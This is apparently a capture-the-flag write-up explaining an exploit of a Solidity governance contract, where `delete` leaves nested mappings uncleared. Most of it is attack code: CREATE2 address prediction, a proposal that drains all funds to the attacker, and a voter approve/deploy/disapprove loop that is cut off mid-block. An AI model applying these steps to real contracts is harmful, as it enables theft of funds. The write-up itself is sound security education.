This vulnerability exposes a flaw in the governance system, allowing for exploitation by malicious actors.

The vulnerability stems from the incorrect clearing of mappings inside structs when using the `delete` keyword. In this case, the flaw occurs in the `deposeViceroy` function of the `Governance` contract.

```solidity
function deposeViceroy(address viceroy, uint256 id) external {
    require(oligargyNFT.ownerOf(id) == msg.sender, "Not an oligarch");
    require(viceroys[viceroy].appointedBy == id, "Only the appointer can depose");

    idUsed[id] = false;
    delete viceroys[viceroy]; // The flaw: Mappings inside the struct are not cleared
}
```

The attacker predicts the address of the `ViceroyAttacker` contract by combining the contract's bytecode with encoded data and hashing it.

```solidity
// Address Prediction
bytes memory bytecode = type(ViceroyAttacker).creationCode;
bytecode = abi.encodePacked(
    bytecode,
    abi.encode(_governance, player, _communityWallet)
);
bytes32 hash = keccak256(
    abi.encodePacked(
        bytes1(0xff),
        address(this),
        uint(123),
        keccak256(bytecode)
    )
);
address deployedAddr = address(uint160(uint(hash)));
```

The attacker appoints the predicted viceroy address as the viceroy, gaining control over approving voters.

```solidity
// Creating a Malicious Proposal
bytes memory data = abi.encodeWithSignature(
    "exec(address,bytes,uint256)", // will transfer balance to player
    _player, // player address
    "0x", // not needed to transfer balance
    value
);
Governance(_governance).createProposal(_player, data);

```

The attacker creates a malicious proposal, including data that will transfer all funds to their account when executed.

```solidity
// Approving Voters and Casting Votes
while (attackCounter < 11) {
    bytes memory bytecode = type(VoterAttacker).creationCode;
    bytecode = abi.encodePacked(
        bytecode,
        abi.encode(_governance, proposalId, address(this))
    );
    bytes32 hash = keccak256(
        abi.encodePacked(
            bytes1(0xff),
            address(this),
            attackCounter,
            keccak256(bytecode)
        )
    );
    address deployedAddr = address(uint160(uint(hash)));

    governance.approveVoter(deployedAddr);
            new VoterAttacker{salt: bytes32(attackCounter)}(
                _governance,
                proposalId,
                address(this)
            );
            governance.disapproveVoter(deployedAddr);
            attackCounter++;
```
